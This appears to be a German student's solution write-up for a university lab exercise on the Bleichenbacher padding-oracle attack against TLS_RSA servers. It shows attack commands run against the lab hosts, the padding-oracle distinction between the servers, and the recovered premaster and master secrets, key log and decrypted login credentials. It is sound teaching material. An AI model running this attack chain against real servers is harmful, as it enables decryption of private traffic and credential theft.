```
Auf dem Server cloud.nds.rub.de laufen 2 TLS Server (mit HTTPS) welche 
unterschiedliche konfiguriert sind:

cloud.nds.rub.de:40064 
cloud.nds.rub.de:40157

Beide Server sind mit demselben Zertifikat ausgestattet. Es ist ihnen gelungen 
die verschlüsselte Kommunikation eines Login Versuchs auf den Server 
cloud.nds.rub.de:40157 aufzuzeichnen.
Die Aufzeichnung finden Sie im angehängten PCAP-File.
```

### Docker Container erstellen

[Dockerfile](./Dockerfile)
```
# build image
$ docker build --tag bleichenbacher-java11 .

# run container
$ docker run --rm --name bleichenbacher java11-bleichenbacher:latest java -jar Attacks.jar bleichenbacher -connect cloud.nds.rub.de:40064
```

## Lösung

> 1. Welche Cipher Suite wurde in der Verbindung ausgehandelt?

Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)

> 2. Kann die ausgehandelte Cipher Suite potenziell mit dem Bleichenbacher Angriff entschlüsselt werden?

Ja, da Schlüsselvereinbarung TLS_RSA ist.

> 3. Wie lauten die Nonces von Client und Server?

Client Nonce: `c111e13ad7249436640715c126decb2c8bcc94b7212002488af14a5e93786781`  
Server Nonce: `23fccc8f2fd92329371261bc96172cb8c9e55eea5a5524572bf7c4243bea5b52`

> 4. Wie lautet das verschlüsselte Premastersecret das der Client an den Server überträgt?

PMS: `533cca14ae7287d7c9f19484d305c6eab2cbe450ea3d69654884be6e253b1682963f263fef48895d2552454a21466776ecf020c3e7fb8373aa5a533be7e7b655823f5fdd2de1e02fe9936055684791412f19c5bdb32bcd359d986688b849938e119207c55910b0dc687f9a736a8664f17839970afcd903fe77a8df53d48d4cb3`

> 5. Analysieren sie die beiden Server auf ihre Verwundbarkeit für den Bleichenbacher-Angriff. Welcher Server ist verwundbar?

Verwundbar:
```bash
java -jar Attacks.jar bleichenbacher -connect cloud.nds.rub.de:40064
```

Nicht verwundbar:
```bash
java -jar Attacks.jar bleichenbacher -connect cloud.nds.rub.de:40157
```

> 6. Beobachten sie während des Tests den Handshake zu dem verwundbaren Server. Welchen Verhaltensunterschied zeigt der Server bei korrekt oder falsch gepaddeten ClientKeyExchange Nachrichten?

Der verwundbare Server unterscheidet zwischen `Handshake Failure` und `Bad Record MAC`.  
Der nicht-verwundbare schickt immmer einen `Bad Record MAC`.

> 7. Wie lautet das entschlüsselte Premaster Secret?

PKCS1.5 kodierte PMS
```
2389e4b6e8b87cc64d5d4f66744faaec304a7877ca7ea3b2e78f325b5a6037d2f4105814a02fb4be7c42f3dc53a8be161a1e314e244095975c7f6d8c4d289fdd2ecc9b13e342ccb0c1d8f5d8690000303e7d9d453c649d684b168428dc67cc46c7b68eb20584ecd9ce45c95d444a3074d646b7aafd991dfe1495f65b03fba
```

Nur das PMS
```
0303e7d9d453c649d684b168428dc67cc46c7b68eb20584ecd9ce45c95d444a3074d646b7aafd991dfe1495f65b03fba
```

> 8. Nutzen Sie nun ihr Wissen und die Tools aus vorherigen Übungen, um das Mastersecret der Verbindung des PCAP-Files zu berechnen. Wie lautet dieses? Hinweis: Wenn Sie alles richtig gemacht haben, beginnt Ihr Mastersecret mit 0xb67cc1

Skript: [calculate-master-secret.py](./calculate-master-secret.py)
```
$ python calcualte-master-secret.py
b67cc1e784858f016119d120cd626d3f2429861e725da693432c8e710ad3bf53c7c2cdabc9a75beb6663e222c2c790ff
```

> 9. Nutzen sie nun Wireshark und das Mastersecret, um die komplette Verbindung zu entschlüsseln. Wie lauten Benutzername und Passwort der BasicAuthentication?

Mit Wireshark lässt sich eine [Logdatei](./ssl.log) erzeugen
```
RSA 533cca14ae7287d7 0303e7d9d453c649d684b168428dc67cc46c7b68eb20584ecd9ce45c95d444a3074d646b7aafd991dfe1495f65b03fba
RSA Session-ID:00 Master-Key:b67cc1e784858f016119d120cd626d3f2429861e725da693432c8e710ad3bf53c7c2cdabc9a75beb6663e222c2c790ff
CLIENT_RANDOM c111e13ad7249436640715c126decb2c8bcc94b7212002488af14a5e93786781 0303e7d9d453c649d684b168428dc67cc46c7b68eb20584ecd9ce45c95d444a3074d646b7aafd991dfe1495f65b03fba
PMS_CLIENT_RANDOM c111e13ad7249436640715c126decb2c8bcc94b7212002488af14a5e93786781 0303e7d9d453c649d684b168428dc67cc46c7b68eb20584ecd9ce45c95d444a3074d646b7aafd991dfe1495f65b03fba
```
Damit kann Wireshark alle TLS-Nachrichten entschlüsseln.

Credentials: `bl3ich3nb4ch3r:opPyCsQzUNjN7iuhYhQR`  
Video: `https://cloud.nds.rub.de:40157/ILIKETHIS.webm`
